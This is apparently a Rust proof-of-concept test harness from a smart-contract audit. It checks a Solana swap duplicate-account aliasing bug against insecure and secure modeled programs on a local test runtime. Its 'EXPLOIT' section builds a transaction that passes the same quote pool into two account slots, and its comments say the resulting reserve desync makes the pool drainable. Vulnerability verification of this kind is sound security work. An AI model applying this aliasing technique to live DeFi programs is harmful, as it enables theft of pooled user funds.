//! Two-sided adjudication PoC for the WOOFi swap quote-pool aliasing wildcard (issue #857).
//! Drives the modeled `swap` handler through the REAL solana-runtime SVM (solana-program-test).
//! The SAME PoC runs against both `insecure.rs` (must VIOLATE) and `secure.rs` (must hold).
//!
//! CONTROL  — three DISTINCT pools (no aliasing): every reserve update must persist exactly.
//! EXPLOIT  — the QUOTE pool is passed into BOTH `pool_to` and `pool_quote` (the WOOFi shape).
//!            * insecure: Anchor's last-declared-copy serialization silently drops one reserve
//!              update -> the quote pool reserve != its correct value -> `INVARIANT VIOLATED:`.
//!            * secure: the duplicate-account constraint rejects the tx -> `invariant held`.
//!
//! A clean reproduction proves the 3/3 convergence is a REAL bug; "invariant held" against the
//! insecure target would prove the three passes shared a hallucination of Anchor's semantics.
use anchor_lang::{AccountDeserialize, AccountSerialize, InstructionData};
use solana_harness_anchor::{instruction as swap_ix, Pool};
use solana_program::{account_info::AccountInfo, entrypoint::ProgramResult, pubkey::Pubkey};
use solana_program_test::{processor, ProgramTest};
use solana_sdk::{
    account::Account,
    instruction::{AccountMeta, Instruction},
    signature::{Keypair, Signer},
    transaction::Transaction,
};

const INIT_RESERVE: u64 = 1_000_000;
const BASE_IN: u64 = 50_000;
const QUOTE_OUT: u64 = 30_000;
const FEE: u64 = 1_000;

fn process_instruction(
    program_id: &Pubkey,
    accounts: &[AccountInfo],
    data: &[u8],
) -> ProgramResult {
    // SAFETY: lifetime bridge only (same as the stock harness poc.rs) — the runner's
    // `AccountInfo`s outlive the synchronous `entry` call.
    let tied: &[AccountInfo] = unsafe { core::mem::transmute(accounts) };
    solana_harness_anchor::entry(program_id, tied, data)
}

/// A program-owned `Pool` account pre-seeded with `INIT_RESERVE` (8-byte anchor
/// discriminator + borsh body, written via the program's own `AccountSerialize`).
fn pool_account(program_id: Pubkey) -> Account {
    let mut data = Vec::new();
    Pool {
        reserve: INIT_RESERVE,
    }
    .try_serialize(&mut data)
    .unwrap();
    Account {
        lamports: 10_000_000,
        data,
        owner: program_id,
        executable: false,
        rent_epoch: 0,
    }
}

async fn read_reserve(banks: &mut solana_program_test::BanksClient, key: Pubkey) -> u64 {
    let acct = banks.get_account(key).await.unwrap().expect("pool exists");
    Pool::try_deserialize(&mut &acct.data[..])
        .expect("decode Pool")
        .reserve
}

#[tokio::main]
async fn main() {
    let program_id: Pubkey = solana_harness_anchor::ID;
    let mut pt = ProgramTest::new(
        "solana_harness_anchor",
        program_id,
        processor!(process_instruction),
    );

    let pool_base = Keypair::new();
    let pool_quote_to = Keypair::new();
    let pool_quote_fee = Keypair::new();
    let pool_base2 = Keypair::new();
    let quote = Keypair::new();

    for kp in [&pool_base, &pool_quote_to, &pool_quote_fee, &pool_base2, &quote] {
        pt.add_account(kp.pubkey(), pool_account(program_id));
    }

    let (mut banks, payer, recent) = pt.start().await;
    let data = swap_ix::Swap {
        base_in: BASE_IN,
        quote_out: QUOTE_OUT,
        fee: FEE,
    }
    .data();

    // ---- CONTROL: three distinct pools, no aliasing. Every update must land. ----
    let ix_ctrl = Instruction {
        program_id,
        accounts: vec![
            AccountMeta::new(pool_base.pubkey(), false),
            AccountMeta::new(pool_quote_to.pubkey(), false),
            AccountMeta::new(pool_quote_fee.pubkey(), false),
        ],
        data: data.clone(),
    };
    let mut tx_ctrl = Transaction::new_with_payer(&[ix_ctrl], Some(&payer.pubkey()));
    tx_ctrl.sign(&[&payer], recent);
    let ctrl = banks.process_transaction(tx_ctrl).await;
    let c_to = if ctrl.is_ok() {
        read_reserve(&mut banks, pool_quote_to.pubkey()).await
    } else {
        u64::MAX
    };
    if ctrl.is_ok() && c_to == INIT_RESERVE - QUOTE_OUT {
        println!("CONTROL OK: distinct-pool swap conserves reserves (quote_to={c_to}, exact)");
    } else {
        println!("control anomaly: ctrl={ctrl:?} quote_to={c_to}");
    }

    // ---- EXPLOIT: the quote pool aliases BOTH `pool_to` and `pool_quote`. ----
    let expected = INIT_RESERVE - QUOTE_OUT + FEE;
    let ix_exp = Instruction {
        program_id,
        accounts: vec![
            AccountMeta::new(pool_base2.pubkey(), false),
            AccountMeta::new(quote.pubkey(), false), // pool_to    = quote pool
            AccountMeta::new(quote.pubkey(), false), // pool_quote = SAME quote pool (aliased)
        ],
        data,
    };
    let mut tx_exp = Transaction::new_with_payer(&[ix_exp], Some(&payer.pubkey()));
    tx_exp.sign(&[&payer], recent);
    let exp = banks.process_transaction(tx_exp).await;

    if exp.is_err() {
        // SECURE variant: the duplicate-account constraint rejected the aliased tx.
        println!("invariant held: aliased swap rejected by duplicate-account guard ({exp:?})");
        return;
    }

    let actual = read_reserve(&mut banks, quote.pubkey()).await;
    if actual != expected {
        let drift = actual as i128 - expected as i128;
        eprintln!(
            "INVARIANT VIOLATED: aliased quote pool reserve = {actual}, correct = {expected} \
             (drift {drift:+}). One reserve update was silently discarded by Anchor's \
             last-declared-copy serialization — the pool reserve desyncs from the vault. \
             quote_out lost => pool over-reports by {QUOTE_OUT}, drainable."
        );
        std::process::exit(101);
    } else {
        println!(
            "invariant held: aliased quote pool reserve = {actual} = correct {expected}. \
             Anchor merged the aliased writes — the convergence does NOT reproduce here."
        );
    }
}
